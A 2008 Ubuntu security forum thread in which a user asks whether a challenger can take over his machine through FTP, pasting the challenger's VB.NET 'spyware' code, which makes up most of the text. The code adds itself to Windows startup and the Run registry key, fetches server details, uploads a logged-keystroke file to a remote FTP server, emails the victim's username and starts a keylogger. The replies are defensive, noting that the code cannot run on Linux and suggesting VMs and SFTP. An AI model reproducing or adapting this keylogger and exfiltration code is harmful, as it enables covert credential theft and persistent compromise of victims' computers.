---
title: "A poster in a forum insists that can take control of my ubuntu box"
date: 2008-12-30
forum: Security
---

### Post by gdp77 on 2008-12-30
Can it be true? He insists that if i connect to a ftp server

MASTER PC <--> FTP SERVER <--> VICTIM PC

his "master pc" can take control of victim pc, take screenshots of my desktop or even open files. He said that he can even do it on my pc, so I chanllenged him and I am waiting to give me "time and place".

He said that he can do it with this code:

[b]SPYWARE IN VB.NET BY NIXZ

[FORM1-FTPMANAGER]:[/b]

```

Imports System.IO
Imports System.Net
Imports System.Net.Mail
Public Class Form1
    'Member Info
    Private MemberUsername = "WebMaster"
    Private MemberEmail = "email@gmail.com"
    'Servers Info
    Private StandardHttpServerMain = "http://restricted.com/"
    Private FtpServerHash As String = "ftp://restricted.com/"
    Private HttpServerHash As String = "http://restricted.com/"
    Private FtpUsername As String = "restricted.com"
    Private FtpPassword As String = "12345"
    'File and Folders Declaration
    Private MainFolder As String = "C:\Temp"
    Private ExeFile As String = "C:\Temp\asvdsadfgv.exe"
    Private KeysFile As String = "C:\Temp\6b657973.dat"
    Private ServerFile As String = "C:\Temp\73657276657273.dat"
    'Public Variables declaration
    Private Hash = String.Empty
    Private Mail As Net.Mail.MailMessage
    Private Server As Net.Mail.SmtpClient
    Private UserLogin As NetworkCredential

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        'Prevent Confusion
        If Process.GetProcessesByName(System.IO.Path.GetFileNameWithoutExtension(Process.GetCurrentProcess.MainModule.ModuleName)).Length > 1 Then
            Me.Close()
        End If
        'Modify Registry
        If Not System.IO.File.Exists((Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Update.exe")) Then
            System.IO.File.Copy(ExeFile, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Update.exe")
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Windows", ExeFile, Microsoft.Win32.RegistryValueKind.String)
        End If
        'Check for Installation
        If Not System.IO.Directory.Exists(MainFolder) Then
            System.IO.Directory.CreateDirectory(MainFolder)
        End If
        'Get Hash
        For Each Chr As Char In My.User.Name.ToString.ToLower
            If Chr = "a" Or Chr = "b" Or Chr = "c" Or Chr = "d" Or Chr = "e" Or Chr = "f" Or Chr = "g" Or Chr = "h" Or Chr = "i" Or Chr = "j" Or Chr = "k" Or Chr = "l" Or Chr = "m" Or Chr = "n" Or Chr = "o" Or Chr = "p" Or Chr = "q" Or Chr = "r" Or Chr = "s" Or Chr = "t" Or Chr = "u" Or Chr = "v" Or Chr = "w" Or Chr = "x" Or Chr = "y" Or Chr = "z" Then
                Hash &= Chr
            End If
        Next
        'Download ServerFile
        If System.IO.File.Exists(ServerFile) Then
            System.IO.File.Delete(ServerFile)
        End If
        My.Computer.Network.DownloadFile(StandardHttpServerMain & "Server.dat", ServerFile)
        'Read ServerFile
        Dim ReadServerInfoFile As New StreamReader(ServerFile)
        FtpServerHash = ReadServerInfoFile.ReadLine
        HttpServerHash = ReadServerInfoFile.ReadLine
        FtpUsername = ReadServerInfoFile.ReadLine
        FtpPassword = ReadServerInfoFile.ReadLine
        ReadServerInfoFile.Close()
        'Delete ServerFile
        If System.IO.File.Exists(ServerFile) Then
            System.IO.File.Delete(ServerFile)
        End If
        'Save Keys on Server
        Dim FTPRequest2 As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create(FtpServerHash & MemberUsername & "/" & Hash & ".txt"), System.Net.FtpWebRequest)
        FTPRequest2.Credentials = New System.Net.NetworkCredential(FtpUsername, FtpPassword)
        FTPRequest2.Method = System.Net.WebRequestMethods.Ftp.UploadFile
        Dim File2() As Byte = System.IO.File.ReadAllBytes(KeysFile)
        Dim FTPStream2 As System.IO.Stream = FTPRequest2.GetRequestStream()
        FTPStream2.Write(File2, 0, File2.Length)
        FTPStream2.Close()
        FTPStream2.Dispose()
        'Send Email
        Mail = New Net.Mail.MailMessage("email@gmail.com", MemberEmail)
        With Mail
            .Subject = "Mail " & "( " & My.User.Name & " )"
            .Body = "Link: " & HttpServerHash & MemberUsername & "/" & Hash & ".txt"
            .IsBodyHtml = False
            .Priority = MailPriority.High
        End With
        Server = New Net.Mail.SmtpClient("smtp.gmail.com", "587")
        Server.EnableSsl = True
        UserLogin = New Net.NetworkCredential("ASDFASD", "ASDFASF")
        Server.Credentials = UserLogin
        Server.Send(Mail)
        Mail.Dispose()
        'Start Keylogger
        Form2.Show()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        'Modify Registry
        If Not System.IO.File.Exists((Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Update.exe")) Then
            System.IO.File.Copy(ExeFile, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Update.exe")
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Windows Services", ExeFile, Microsoft.Win32.RegistryValueKind.String)
        End If
        'Check for Installation
        If Not System.IO.Directory.Exists(MainFolder) Then
            System.IO.Directory.CreateDirectory(MainFolder)
        End If
        'Get Hash
        For Each Chr As Char In My.User.Name.ToString.ToLower
            If Chr = "a" Or Chr = "b" Or Chr = "c" Or Chr = "d" Or Chr = "e" Or Chr = "f" Or Chr = "g" Or Chr = "h" Or Chr = "i" Or Chr = "j" Or Chr = "k" Or Chr = "l" Or Chr = "m" Or Chr = "n" Or Chr = "o" Or Chr = "p" Or Chr = "q" Or Chr = "r" Or Chr = "s" Or Chr = "t" Or Chr = "u" Or Chr = "v" Or Chr = "w" Or Chr = "x" Or Chr = "y" Or Chr = "z" Then
                Hash &= Chr
            End If
        Next
        'Download ServerFile
        If System.IO.File.Exists(ServerFile) Then
            System.IO.File.Delete(ServerFile)
        End If
        My.Computer.Network.DownloadFile(StandardHttpServerMain & "Server.dat", ServerFile)
        'Read ServerFile
        Dim ReadServerInfoFile As New StreamReader(ServerFile)
        FtpServerHash = ReadServerInfoFile.ReadLine
        HttpServerHash = ReadServerInfoFile.ReadLine
        FtpUsername = ReadServerInfoFile.ReadLine
        FtpPassword = ReadServerInfoFile.ReadLine
        ReadServerInfoFile.Close()
        'Delete ServerFile
        If System.IO.File.Exists(ServerFile) Then
            System.IO.File.Delete(ServerFile)
        End If
        'Download KeysFile
        If System.IO.File.Exists(KeysFile) Then
            System.IO.File.Delete(KeysFile)
        End If
        My.Computer.Network.DownloadFile(HttpServerHash & MemberUsername & "/" & Hash & ".txt", KeysFile)
        'Read KeysFile
        Dim ReadKeysFile As New StreamReader(KeysFile)
        Dim Keys = ReadKeysFile.ReadToEnd
        ReadKeysFile.Close()
        'Save KeysFile
        Dim WriteKeysFile2 As New StreamWriter(KeysFile)
        WriteKeysFile2.Write(Keys)
        WriteKeysFile2.Close()
        'Save Keys on Server
        Dim FTPRequest2 As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create(FtpServerHash & MemberUsername & "/" & Hash & ".txt"), System.Net.FtpWebRequest)
        FTPRequest2.Credentials = New System.Net.NetworkCredential(FtpUsername, FtpPassword)
        FTPRequest2.Method = System.Net.WebRequestMethods.Ftp.UploadFile
        Dim File2() As Byte = System.IO.File.ReadAllBytes(KeysFile)
        Dim FTPStream2 As System.IO.Stream = FTPRequest2.GetRequestStream()
        FTPStream2.Write(File2, 0, File2.Length)
        FTPStream2.Close()
        FTPStream2.Dispose()
    End Sub
End Class

```

Should I be afraid? Can he break a fully updated Ubuntu so easily?

---

### Post by dperfors on 2008-12-30
Don't be afraid, when you are running Ubuntu this code won't even run correctly.. (there are windows directories that don't exist on linux :))

---

### Post by keithweddell on 2008-12-30
I suppose you don't have any guarantee that he won't use a different script to attempt to crack a linux box.  

You could do the trial from a virtual machine (eg using virtualbox). Use different account names / passwords from your main installation so that if he succeeds, he doesn't compromise anything except the virtual machine, which you can delete as soon as you finish the trial.

I would also be careful of the ftp account that you use for the trial as ftp credentials are passed in the clear.  Maybe you could set up a new account that you can immediately delete afterwards.

Keith

---

### Post by gdp77 on 2008-12-30
The script above is used for win boxes. He said that he could create something similar for an ubuntu box. 

I think i will go on with the trial using my installation. I believe (until proved otherwise) that a ubuntu box is extremely safe. Are there any known vulnerabilities regarding linux and ftp?

---

### Post by hyper_ch on 2008-12-30
why can he even login and run that?

And I would stop using ftp and run ssh server/sftp instead. Then you can install a policy daemon (denyhosts/fail2ban) and for giving access to "friends" you could setup mysecureshell instead of giving them a plain shell account.

---

### Post by keithweddell on 2008-12-30
Read the first post.  This is a challenge not a real life situation.

Keith

---

### Post by hyper_ch on 2008-12-30
if you never try it in life then how can you know?

---

### Post by cdenley on 2008-12-30
I doubt simply connecting to an FTP server would install or run any malware like the windows example you posted. I would assume that he meant you would have to download a malware script from an FTP server, make it executable (or extract it if tar'd), then run it. Any operating system is vulnerable to malware which the user runs willingly.

---

